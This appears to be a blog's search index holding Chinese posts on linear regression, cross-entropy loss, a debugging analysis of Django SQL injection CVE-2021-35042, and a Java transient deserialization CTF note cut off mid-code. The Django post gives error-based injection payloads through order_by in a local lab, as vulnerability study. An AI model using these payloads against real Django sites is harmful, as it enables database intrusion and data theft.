<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Easy Linear Regression</title>
    <url>/2022/06/20/Linear-Regression/</url>
    <content><![CDATA[<p><a href="https://d2l.ai/chapter_linear-networks/linear-regression.html">https://d2l.ai/chapter_linear-networks/linear-regression.html</a> 对该篇文章进行代码实现<br><span id="more"></span></p>
<h2 id="1-基本流程"><a href="#1-基本流程" class="headerlink" title="1.基本流程"></a>1.基本流程</h2><p>首先需要有一个梯度下降算法 梯度下降算法可以参考<a href="https://www.zhihu.com/question/305638940/answer/1639782992">https://www.zhihu.com/question/305638940/answer/1639782992</a><br>再就是损失函数的实现</p>
<p>那么整套的基本流程就是</p>
<blockquote>
<ul>
<li>设计基本模型，再本章中我们要实现预测房价的走向 <strong>（完全不准 损失值<em>loss</em> 过大 主要是设计思路）</strong><script type="math/tex; mode=display">
y= w_{\mathrm{area}} \cdot area + w_{\mathrm{age}} \cdot age + b + \epsilon</script>$ \epsilon $是损失值，b是偏差值，两个w为权重</li>
<li>读取房龄和面积的基本数据（广州房价数据） <a href="data.csv" title="data下载">点击下载</a></li>
<li>随机抽取部分样本进行梯度下降，如此往复一定次数，最后得出训练结果</li>
</ul>
</blockquote>
<h2 id="2-提取数据"><a href="#2-提取数据" class="headerlink" title="2.提取数据"></a>2.提取数据</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = pd.read_csv(<span class="string">&quot;data.csv&quot;</span>)</span><br><span class="line">data = np.array(data)</span><br><span class="line">features = data[:,<span class="number">1</span>:<span class="number">3</span>] <span class="comment">#获取房子面积和房子建造日期</span></span><br><span class="line">features[:,<span class="number">0</span>] = <span class="number">2022</span> - features[:,<span class="number">0</span>] <span class="comment">#获取房龄</span></span><br><span class="line">labels = data[:,<span class="number">0</span>] <span class="comment">#获取房价</span></span><br></pre></td></tr></table></figure>
<p>对样本进行随机抽样，每次返回batch_size个真实样本数据<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">data_iter</span>(<span class="params">batch_size, features, labels</span>):</span><br><span class="line">    num_examples = <span class="built_in">len</span>(features)</span><br><span class="line">    indices = <span class="built_in">list</span>(<span class="built_in">range</span>(num_examples))</span><br><span class="line">    <span class="comment"># The examples are read at random, in no particular order</span></span><br><span class="line">    random.shuffle(indices)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, num_examples, batch_size):</span><br><span class="line">        batch_indices = np.array(</span><br><span class="line">            indices[i: <span class="built_in">min</span>(i + batch_size, num_examples)])</span><br><span class="line">        <span class="keyword">yield</span> features[batch_indices], labels[batch_indices]<span class="comment">#已经完成去重操作了，用这种模式</span></span><br></pre></td></tr></table></figure></p>
<h2 id="3-设计基本的函数"><a href="#3-设计基本的函数" class="headerlink" title="3. 设计基本的函数"></a>3. 设计基本的函数</h2><ul>
<li><p>损失函数 (loss function)<br><script type="math/tex">\dfrac{(\hat{y}-y)^2}{2}</script> 预估值与实际值的差，式子求导后可以得到实际差值，代码实现如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">squared_loss</span>(<span class="params">y_hat, y</span>):</span><br><span class="line">    <span class="keyword">return</span> (y_hat - y.reshape(y_hat.shape)) ** <span class="number">2</span> / <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>y_hat是预测值，y是实际房价</p>
</li>
<li><p>梯度下降 (gradient descent)</p>
<script type="math/tex; mode=display">(\mathbf{w},b) - \frac{lr}{|\mathcal{batchsize}|} \sum_{i \in \mathcal{B}} \partial_{(\mathbf{w},b)} l^{(i)}(\mathbf{w},b).</script><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sgd</span>(<span class="params">params, lr, batch_size</span>):</span><br><span class="line">    <span class="keyword">for</span> param <span class="keyword">in</span> params:</span><br><span class="line">        param[:] = param - lr * param.grad / batch_size</span><br></pre></td></tr></table></figure>
<p>lr是步长，一般都用较小值0.00001这样的<br>params就是前面公式的w，b</p>
</li>
<li><p>线性回归（linear regression）</p>
<script type="math/tex; mode=display">y= w_{\mathrm{area}} \cdot area + w_{\mathrm{age}} \cdot age + b</script><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">linreg</span>(<span class="params">X, w, b</span>):</span><br><span class="line">    <span class="keyword">return</span> np.dot(X, w) + b</span><br></pre></td></tr></table></figure>
<p>w是一个矩阵，w=[w_area,w_age]<br>X是真实数据<br>他们点乘可得到预测值</p>
</li>
</ul>
<h2 id="4-最后算法"><a href="#4-最后算法" class="headerlink" title="4.最后算法"></a>4.最后算法</h2><p>首先让步长等于0.0000000001，这种一般是猜出来的<br>循环次数为10<br>样本大小为10<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lr = <span class="number">0.0000000001</span></span><br><span class="line">num_epochs = <span class="number">10</span></span><br><span class="line">batch_size = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(num_epochs):</span><br><span class="line">    <span class="keyword">for</span> X, y <span class="keyword">in</span> data_iter(batch_size, features, labels):<span class="comment">#X，y为抽样结果</span></span><br><span class="line">        <span class="keyword">with</span> autograd.record():</span><br><span class="line">            y_hat = linreg(X, w, b)<span class="comment">#得到预测值（初始w，b需设置多组，因为梯度下降法是在局部中找到极值，可能在其它地方也有极值点）</span></span><br><span class="line">            l = squared_loss(y_hat, y) <span class="comment">#算出损失</span></span><br><span class="line">        l.backward()<span class="comment">#求积分</span></span><br><span class="line">        sgd([w, b], lr, batch_size) <span class="comment">#梯度下降</span></span><br><span class="line">    train_l = squared_loss(linreg(features, w, b), labels)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;epoch <span class="subst">&#123;epoch + <span class="number">1</span>&#125;</span>, loss <span class="subst">&#123;<span class="built_in">float</span>(train_l.mean()):f&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure></p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>这应该是最简单的模型了，最后运行偏差值过大，应该是因为这个本事影响参数（权重）太少了，只有房龄和面积，所以无法预测，如果用散点图plt去看，也会看到他太过分散。还需要继续去学习，看英语文章太痛苦了，但是也得习惯</p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>implement of cross entropy loss</title>
    <url>/2022/06/22/implement-of-cross-entropy-loss/</url>
    <content><![CDATA[<p>首先来看看交叉熵函数公式是怎么样的</p>
<script type="math/tex; mode=display">l(\mathbf{y}, \hat{\mathbf{y}}) = - \sum_{j=1}^q y_j \log \hat{y}_j.</script><span id="more"></span>
<p>此方法多用于分类问题，也就是每个种类概率为多少，最后得出一个向量vector<br>可以看看这篇文章的解释<br><a href="https://d2l.ai/chapter_linear-networks/softmax-regression.html">https://d2l.ai/chapter_linear-networks/softmax-regression.html</a></p>
<blockquote>
<p>The component corresponding to particular instance’s category is set to 1 and all other components are set to 0. In our case, a label $y$ would be a three-dimensional vector, with $(1, 0, 0)$ corresponding to “cat”, $(0, 1, 0)$ to “chicken”, $(0, 0, 1)$ and to “dog”</p>
</blockquote>
<p>大致意思是用向量来表示每个物种<br>如果我们测出了一个图片的分类概率是 $\hat{y} = (0.2,0.3,0.5)$，而实际上这个物种是一个狗，也就是 $y= (0,0,1)$，那么预测值与实际值的损失是多少呢？<br>那么就要用到上面的cross-entropy，交叉熵函数了<br>把上面的向量带入公式，可以得到 <script type="math/tex">l(\mathbf{y}, \hat{\mathbf{y}}) = -(0\cdot \log 0.2+0\cdot \log 0.3+1\cdot \log 0.5)</script><br>那么观察可以发现，除了真实项，其它都为0，那么设计代码的时候可以直接预测值里面那个与实际项对应的数求对数<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cross_entropy</span>(<span class="params">y_hat, y</span>):</span><br><span class="line">    <span class="keyword">return</span> - np.log(y_hat[<span class="built_in">range</span>(<span class="built_in">len</span>(y_hat)), y])</span><br><span class="line">y_hat = np.array([[<span class="number">0.1</span>, <span class="number">0.3</span>, <span class="number">0.6</span>], [<span class="number">0.3</span>, <span class="number">0.2</span>, <span class="number">0.5</span>],[<span class="number">0.2</span>,<span class="number">0.7</span>,<span class="number">0.1</span>],[<span class="number">0.8</span>,<span class="number">0.1</span>,<span class="number">0.1</span>]])</span><br><span class="line">y=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">cross_entropy(y_hat, y)</span><br></pre></td></tr></table></figure><br>y代表每一组样本中，实际值，比如1代表$(0,1,0)$,2代表$(0,0,1)$<br>显示结果就是<br><code>array([1.2039728, 0.6931472, 1.609438 , 2.3025851])</code><br>可以用计算器算一下-log(0.3),-log(0.5),就是上面的结果</p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>python</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>cve-2021-35042 django sql注入 调试分析</title>
    <url>/2022/06/10/cve-2021-35042/</url>
    <content><![CDATA[<ul>
<li><h2 id="1-如何调试django"><a href="#1-如何调试django" class="headerlink" title="1.如何调试django"></a>1.如何调试django</h2><blockquote>
<p>因为只能找到一些分析文章，但是感觉不透彻，自己干看代码又太难了，google半天找到一个好调试django的方法，结合我自己的一些思路可以调到django源码，而不是单纯调试二次开发的代码，本篇将尽可能从不知道这个函数存在漏洞开始讲解</p>
 <span id="more"></span>
<p>如果想调试二次开发的代码，可以参考以下链接<br> <a href="https://code.visualstudio.com/docs/python/tutorial-django">https://code.visualstudio.com/docs/python/tutorial-django</a><br> 这是vscode的<br><br> 首先需要安装对应版本的django，可以使用以下链接进行搭建博客<br> <a href="https://github.com/H3rmesk1t/Django-SQL-Inject-Env/tree/main/CVE-2021-35042">https://github.com/H3rmesk1t/Django-SQL-Inject-Env/tree/main/CVE-2021-35042</a><br><br> 最好使用python虚拟环境进行搭建，这样就能更方便进行多版本操作<br> 这是官方的搭建python虚拟环境方法<br> <a href="https://docs.python.org/3.8/library/venv.html#creating-virtual-environments">https://docs.python.org/3.8/library/venv.html#creating-virtual-environments</a><br> 我这里就不多介绍了<br><br> 那么搭建完成以后，如何进行调试django<br> StackOverflow上面的方法就是用pdb进行断点调试<br> <code>pdb.set_trace()</code></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vuln</span>(<span class="params">request</span>):</span><br><span class="line">    query = request.GET.get(<span class="string">&#x27;order_by&#x27;</span>, default=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    pdb.set_trace()</span><br><span class="line">    res = User.objects.order_by(query)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(res.values())</span><br></pre></td></tr></table></figure>
<p>我在order_by前面加上了一个断点，在命令行执行<br> <code>python app.py runserver 127.0.0.1:8000</code><br> 然后访问一下<br> <a href="http://127.0.0.1:8000/vuln/?order_by=id">http://127.0.0.1:8000/vuln/?order_by=id</a><br> <img src="/2022/06/10/cve-2021-35042/1.jpg" alt><br> 可以看到进入了断点<br> 在这里介绍一下几个常用命令</p>
<blockquote>
<p>n: 相当于vscode里面的跨越，也就是执行一条语句，如果是函数就跨越里面<br> s: 就是步进，可以执行到函数里面<br> a: 查看当前变量<br> w: 查看调用堆栈<br> p variable: 查看变量，当然也可以直接输入变量名<br> l: 查看当前上下11行代码<br> c: continue继续执行到下一个断点，如果没有就直接全部执行</p>
</blockquote>
<p><a href="https://docs.python.org/3/library/pdb.html">https://docs.python.org/3/library/pdb.html</a>这是pdb相关文档<br><br>接下来配合vscode，或者其它编辑器，就可以开始代码审计了</p>
</blockquote>
</li>
<li><h2 id="2-开始审计"><a href="#2-开始审计" class="headerlink" title="2.开始审计"></a>2.开始审计</h2><blockquote>
<p>首先需要知道order_by这段源码在哪里，我们可以直接去官网查看数据库相关源码，然后再在本地去寻找<br> <a href="https://docs.djangoproject.com/en/2.0/_modules/django/db/models/query/">https://docs.djangoproject.com/en/2.0/_modules/django/db/models/query/</a><br> 这就是数据库相关源码，在虚拟环境打开这个文件，找到order_by，我这里是<code>C:\Users\xxxxx\\.virtualenvs\django3.2-H6Gg1cu_\Lib\site-packages\django\db\models\query.py</code><br> 然后下断点，在这里说一下题外话</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vuln</span>(<span class="params">request</span>):</span><br><span class="line">    query = request.GET.get(<span class="string">&#x27;order_by&#x27;</span>, default=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    res = User.objects.order_by(query)<span class="comment">#这一段并不会执行sql语句</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(res.values())<span class="comment">#他调用了values才会执行</span></span><br></pre></td></tr></table></figure>
<p>继续断点，找到order_by，在这下断点<br> <img src="/2022/06/10/cve-2021-35042/2.jpg" alt><br> 下了断点以后，重启服务器，浏览器访问使用了order_by的那个操作页面,我这里是<br> <a href="http://127.0.0.1:8000/vuln/?order_by=id">http://127.0.0.1:8000/vuln/?order_by=id</a><br> 命令行就会断到这里<br> <img src="/2022/06/10/cve-2021-35042/3.jpg" alt><br> 可以看到确实进来了<br> 输入field_names，可以看到是我们get的参数<br> <img src="/2022/06/10/cve-2021-35042/4.jpg" alt><br> 那么输入s，进入clear_ordering，看看执行了什么<br> <img src="/2022/06/10/cve-2021-35042/5.jpg" alt><br> 可以看到是先执行了这个装饰器函数，因为没有对我们的field_names执行操作，所以就跳过，来到clear_ordering里面<br> <img src="/2022/06/10/cve-2021-35042/6.jpg" alt><br> 只是清空了一些操作，可能是防止上一次order_by的操作对这一次产生影响（如果其它开发人员多次使用了order_by这个函数）但是还是没有对我们的field_names进行过滤什么的，那么就继续，步进到add_ordering里面 <strong>(这里就是关键操作了)</strong><br> 从pdb可以看出，add_ordering在<code>\db\models\sql\query.py</code>这个文件中，用vscode打开</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> ordering:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">        warnings.warn(</span><br><span class="line">            <span class="string">&#x27;Passing column raw column aliases to order_by() is &#x27;</span></span><br><span class="line">            <span class="string">&#x27;deprecated. Wrap %r in a RawSQL expression before &#x27;</span></span><br><span class="line">            <span class="string">&#x27;passing it to order_by().&#x27;</span> % item,</span><br><span class="line">            category=RemovedInDjango40Warning,</span><br><span class="line">            stacklevel=<span class="number">3</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> item == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> item.startswith(<span class="string">&#x27;-&#x27;</span>):</span><br><span class="line">        item = item[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">in</span> self.annotations:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> self.extra <span class="keyword">and</span> item <span class="keyword">in</span> self.extra:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># names_to_path() validates the lookup. A descriptive</span></span><br><span class="line">    <span class="comment"># FieldError will be raise if it&#x27;s not.</span></span><br><span class="line">    self.names_to_path(item.split(LOOKUP_SEP), self.model._meta)</span><br><span class="line"><span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(item, <span class="string">&#x27;resolve_expression&#x27;</span>):</span><br><span class="line">    errors.append(item)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">getattr</span>(item, <span class="string">&#x27;contains_aggregate&#x27;</span>, <span class="literal">False</span>):</span><br><span class="line">    <span class="keyword">raise</span> FieldError(</span><br><span class="line">        <span class="string">&#x27;Using an aggregate in order_by() without also including &#x27;</span></span><br><span class="line">        <span class="string">&#x27;it in annotate() is not allowed: %s&#x27;</span> % item</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">if</span> errors:</span><br><span class="line">    <span class="keyword">raise</span> FieldError(<span class="string">&#x27;Invalid order_by arguments: %s&#x27;</span> % errors)</span><br><span class="line"><span class="keyword">if</span> ordering:</span><br><span class="line">    self.order_by += ordering</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    self.default_ordering = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>可以看到一行注释<br> <code># names_to_path() validates the lookup. A descriptive FieldError will be raise if it&#39;s not.</code><br> 那么这一行大概就是对参数进行过滤的，可以看看里面的重要代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path, names_with_path = [], []</span><br><span class="line"><span class="keyword">for</span> pos, name <span class="keyword">in</span> <span class="built_in">enumerate</span>(names):</span><br><span class="line">cur_names_with_path = (name, [])</span><br><span class="line"><span class="keyword">if</span> name == <span class="string">&#x27;pk&#x27;</span>:</span><br><span class="line">    name = opts.pk.name</span><br><span class="line"></span><br><span class="line">field = <span class="literal">None</span></span><br><span class="line">filtered_relation = <span class="literal">None</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    field = opts.get_field(name)</span><br><span class="line"><span class="keyword">except</span> FieldDoesNotExist:</span><br></pre></td></tr></table></figure>
<p>注意到这个<code>opts.get_field</code>,是提取表名的一个函数，从缓存中提取，而不是进行sql操作，有兴趣的可以自己进行调试，这里不做过多赘述，总之就是如果不存在这个表就会抛出异常，那么add_ordering里面的<code>self.order_by += ordering</code>就无法执行<br> <img src="/2022/06/10/cve-2021-35042/14.jpg" alt><br> 而order_by在上一个clear_ordering被清空了，<strong>执行sql操作的时候会使用到self.order_by操作</strong><br> 那么就需要绕过这个<code>names_to_path()</code><br><br> 先继续我们的pdb操作<br> 输入ordering<br> <img src="/2022/06/10/cve-2021-35042/7.jpg" alt><br> 可以看到<code>for item in ordering:</code>这个循环就是要遍历我们url里面的get参数，也就是order_by这个参数<br> <a href="http://127.0.0.1:8000/vuln/?order_by=id">http://127.0.0.1:8000/vuln/?order_by=id</a><br> 而这个循环只会循环一次，因为我们元组只有一个<br> 而names_to_path()也在循环里面，而且在最后执行，也就是说如果在中途跳出这个循环，那么也就是跳出了整个循环，也就不会进行检测我们的参数。<br> 看回到这个循环操作代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> ordering:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">            warnings.warn(</span><br><span class="line">                <span class="string">&#x27;Passing column raw column aliases to order_by() is &#x27;</span></span><br><span class="line">                <span class="string">&#x27;deprecated. Wrap %r in a RawSQL expression before &#x27;</span></span><br><span class="line">                <span class="string">&#x27;passing it to order_by().&#x27;</span> % item,</span><br><span class="line">                category=RemovedInDjango40Warning,</span><br><span class="line">                stacklevel=<span class="number">3</span>,</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> item == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> item.startswith(<span class="string">&#x27;-&#x27;</span>):</span><br><span class="line">            item = item[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">in</span> self.annotations:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> self.extra <span class="keyword">and</span> item <span class="keyword">in</span> self.extra:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># names_to_path() validates the lookup. A descriptive</span></span><br><span class="line">        <span class="comment"># FieldError will be raise if it&#x27;s not.</span></span><br><span class="line">        self.names_to_path(item.split(LOOKUP_SEP), self.model._meta)</span><br></pre></td></tr></table></figure>
<p>这几个if里面有continue操作，如果进去了一个，就可以跳出这个循环，而不执行<code>names_to_path</code><br> 首先看第一个</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">    warnings.warn(</span><br><span class="line">        <span class="string">&#x27;Passing column raw column aliases to order_by() is &#x27;</span></span><br><span class="line">        <span class="string">&#x27;deprecated. Wrap %r in a RawSQL expression before &#x27;</span></span><br><span class="line">        <span class="string">&#x27;passing it to order_by().&#x27;</span> % item,</span><br><span class="line">        category=RemovedInDjango40Warning,</span><br><span class="line">        stacklevel=<span class="number">3</span>,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>如果参数中有”.”，就会跳出，这是程序员想着可以使用这种方式<br> table.collection方式用表名和collection，来进行排序，下面这段是思路拓宽，但是没什么用，不想看可以跳过</p>
<blockquote>
<p>那么这时候可能就有人想，能不能访问到其它表中的数据，我们可以试一下，不打断点，直接访问其它表，比如下图这个<br> <img src="/2022/06/10/cve-2021-35042/8.jpg" alt><br> 我们试一下<br> <a href="http://127.0.0.1:8000/vuln/?order_by=django_migrations.name">http://127.0.0.1:8000/vuln/?order_by=django_migrations.name</a><br> <img src="/2022/06/10/cve-2021-35042/9.jpg" alt><br> 可以看到报错了，这时候要找到具体是什么问题<br> 由上面报错信息可以得知<br> <code>File &quot;C:\Users\xxxxx\.virtualenvs\django3.2-H6Gg1cu_\lib\site-packages\django\db\backends\mysql\base.py&quot;, line 75, in execute
 return self.cursor.execute(query, args)</code><br> 在base.py中75行下个断点，看看query具体都是是什么<br> <img src="/2022/06/10/cve-2021-35042/10.jpg" alt><br> 这是第一个query，应该是写死的了，看第二个<br> <img src="/2022/06/10/cve-2021-35042/11.jpg" alt><br> 这就是我们想要的了<br> <code>SELECT `vuln_app_user`.`id`, `vuln_app_user`.`name` FROM `vuln_app_user` ORDER BY (`django_migrations`.name) ASC</code><br> 也就是他前面都是写死的了，order by后面才是我们get参数的，所以不能访问其它表</p>
</blockquote>
<p>那我们回到刚刚循环处<br> 我们可以通过”.”来绕过<br> payload可以写成这样<br> <code>vuln_app_user.id);select updatexml(1, concat(0x7e,(select @@version)),1)%23</code><br> 这个”.”就在vuln_app_user.id这<br><br> 那么有人可能会想，如果把点加到其它地方行不行<br> 那就继续执行，看看到底行不行<br> 前面说过，真正执行sql操作是在<code>res.values()</code>的时候<br> 那就换个地方打断点，把之前的断点撤掉</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vuln</span>(<span class="params">request</span>):</span><br><span class="line">    query = request.GET.get(<span class="string">&#x27;order_by&#x27;</span>, default=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    res = User.objects.order_by(query)</span><br><span class="line">    pdb.set_trace()</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(res.values())</span><br></pre></td></tr></table></figure>
<p>重新进行访问<br> 因为我们需要看的是self.query.order_by这个参数，所以就在调试的时候尽可能快进到有这个参数的地方<br> <img src="/2022/06/10/cve-2021-35042/12.jpg" alt><br> 最后来到这里<br> field就是query.order_by这个参数，可以用ll命令看多行代码<br> <img src="/2022/06/10/cve-2021-35042/13.jpg" alt></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table, col = col.split(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">order_by.append((</span><br><span class="line">    OrderBy(</span><br><span class="line">        RawSQL(<span class="string">&#x27;%s.%s&#x27;</span> % (self.quote_name_unless_alias(table), col), []),</span><br><span class="line">        descending=descending</span><br><span class="line">    ), <span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
<p>他会将点的位置进行切分，然后再给table加上反引号再去拼接，也就是如果我们随便加个点<br> 比如<br> <code>id.);select updatexml(1, concat(0x7e,(select @@version)),1)%23</code><br> 那他就会变为</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`id`.);select updatexml(1, concat(0x7e,(select @@version)),1)%23</span><br></pre></td></tr></table></figure>
<p>那样就会直接报错，而不是报后面updatexml的报错注入<br> 当然也应该有其它绕过方式，比如多加个反引号之类进行闭合，但是我也不太懂，</p>
</blockquote>
</li>
<li><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><blockquote>
<p>主要问题就是可以绕过names_to_path的检测，然后把恶意代码直接拼接进去，但是可能需要知道数据表名称才能注入，我也不太清楚如何能不靠数据表进行注入，希望有大佬懂得话可以评论留言</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>sql注入</tag>
        <tag>代码审计</tag>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title>java transient反序列化</title>
    <url>/2022/08/02/java-transient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>遇到ctf题目里面需要反序列化transient关键字的变量<br>但是transient关键字修饰的变量是不进入反序列的<br><span id="more"></span><br>下面是部分代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testC</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String height;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">testC</span><span class="params">(String name, String age, String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHeight</span><span class="params">(String height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="built_in">this</span>.height = (String)s.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> testC) &#123;</span><br><span class="line">            <span class="type">testC</span> <span class="variable">user</span> <span class="operator">=</span> (testC)obj;</span><br><span class="line">            <span class="keyword">return</span> user.getAge().equals(<span class="built_in">this</span>.age) &amp;&amp; user.getHeight().equals(<span class="built_in">this</span>.height) &amp;&amp; user.getName().equals(<span class="built_in">this</span>.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;name=&#x27;&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&quot;, age=&#x27;&quot;</span> + <span class="built_in">this</span>.age + <span 